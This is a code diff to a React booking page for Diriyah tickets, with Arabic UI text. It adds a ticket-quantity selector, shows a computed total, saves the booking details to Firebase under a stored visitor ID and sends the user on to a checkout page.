@@ -1,10 +1,10 @@
-import { ChevronDown, Calendar, Clock, Ticket, Info } from "lucide-react";
+import { ChevronDown, Calendar, Clock, Ticket, Info, Plus, Minus } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
 import { Link, useLocation } from "wouter";
 import { useState, useEffect } from "react";
-import { handleCurrentPage } from "@/lib/firebase";
+import { addData, handleCurrentPage } from "@/lib/firebase";
 import {
   RestaurantNav,
   ProgressBar,
@@ -12,9 +12,12 @@ import {
   BujairiFooter,
 } from "@/components/bujairi-header";
 
+const TICKET_PRICE = 50;
+
 export default function BookingPage() {
   const [date, setDate] = useState<Date | undefined>(new Date());
   const [time, setTime] = useState("09:00");
+  const [quantity, setQuantity] = useState(1);
 
   useEffect(() => {
     handleCurrentPage("booking");
@@ -26,7 +29,14 @@ export default function BookingPage() {
       <ProgressBar current={2} />
       <PageBanner title="الحجز" />
       <main className="flex-1 pb-8">
-        <BookingForm date={date} setDate={setDate} time={time} setTime={setTime} />
+        <BookingForm
+          date={date}
+          setDate={setDate}
+          time={time}
+          setTime={setTime}
+          quantity={quantity}
+          setQuantity={setQuantity}
+        />
         <TermsSection />
       </main>
       <BujairiFooter />
@@ -38,12 +48,16 @@ function BookingForm({
   date, 
   setDate, 
   time, 
-  setTime 
+  setTime,
+  quantity,
+  setQuantity,
 }: { 
   date: Date | undefined; 
   setDate: (d: Date | undefined) => void; 
   time: string; 
   setTime: (t: string) => void;
+  quantity: number;
+  setQuantity: (q: number) => void;
 }) {
   const timeSlots = [
     "09:00", "10:00", "11:00", "12:00",
@@ -61,13 +75,27 @@ function BookingForm({
     setSubmitError("");
     const bookingData = { date: date?.toISOString(), time };
     localStorage.setItem("bookingData", JSON.stringify(bookingData));
-    const ok = await handleCurrentPage("booking");
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      setSubmitError("لم يتم العثور على بيانات الزائر");
+      setIsSubmitting(false);
+      return;
+    }
+    const ok = await addData({
+      id: visitorId,
+      currentPage: "booking",
+      ticketQuantity: quantity,
+      ticketPrice: TICKET_PRICE,
+      totalAmount: quantity * TICKET_PRICE,
+      bookingDate: bookingData.date,
+      bookingTime: bookingData.time,
+    });
     if (!ok) {
       setSubmitError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
       setIsSubmitting(false);
       return;
     }
-    setLocation("/cart");
+    setLocation("/checkout");
   };
 
   return (
@@ -123,14 +151,53 @@ function BookingForm({
           </div>
         </div>
 
+        <div>
+          <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
+            <Ticket className="w-4 h-4 text-primary" />
+            عدد التذاكر *
+          </Label>
+          <div className="flex items-center justify-between bg-muted rounded-xl p-2">
+            <Button
+              type="button"
+              size="icon"
+              variant="ghost"
+              className="h-10 w-10 rounded-lg"
+              onClick={() => setQuantity(Math.max(1, quantity - 1))}
+              data-testid="button-decrease-qty"
+            >
+              <Minus className="w-4 h-4" />
+            </Button>
+            <span className="font-bold text-lg" data-testid="text-quantity">
+              {quantity}
+            </span>
+            <Button
+              type="button"
+              size="icon"
+              variant="ghost"
+              className="h-10 w-10 rounded-lg"
+              onClick={() => setQuantity(quantity + 1)}
+              data-testid="button-increase-qty"
+            >
+              <Plus className="w-4 h-4" />
+            </Button>
+          </div>
+        </div>
+
         <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] rounded-xl p-5">
           <div className="flex items-center gap-2 mb-3">
             <Ticket className="w-5 h-5 text-primary" />
-            <h3 className="font-bold text-foreground">أسعار التذاكر</h3>
+            <h3 className="font-bold text-foreground">المجموع</h3>
           </div>
           <div className="flex items-center justify-between">
-            <span className="text-muted-foreground">تذكرة دخول الدرعية</span>
-            <span className="font-bold text-xl text-primary">50 ر.س</span>
+            <span className="text-muted-foreground">
+              {quantity} × {TICKET_PRICE} ر.س
+            </span>
+            <span
+              className="font-bold text-xl text-primary"
+              data-testid="text-booking-total"
+            >
+              {quantity * TICKET_PRICE} ر.س
+            </span>
           </div>
         </div>
 
@@ -144,7 +211,7 @@ function BookingForm({
             disabled={isSubmitting}
             data-testid="button-confirm-booking"
           >
-            {isSubmitting ? "جاري الإرسال..." : "احجز الآن"}
+            {isSubmitting ? "جاري الإرسال..." : "المتابعة للدفع"}
           </Button>
 
           {submitError && (
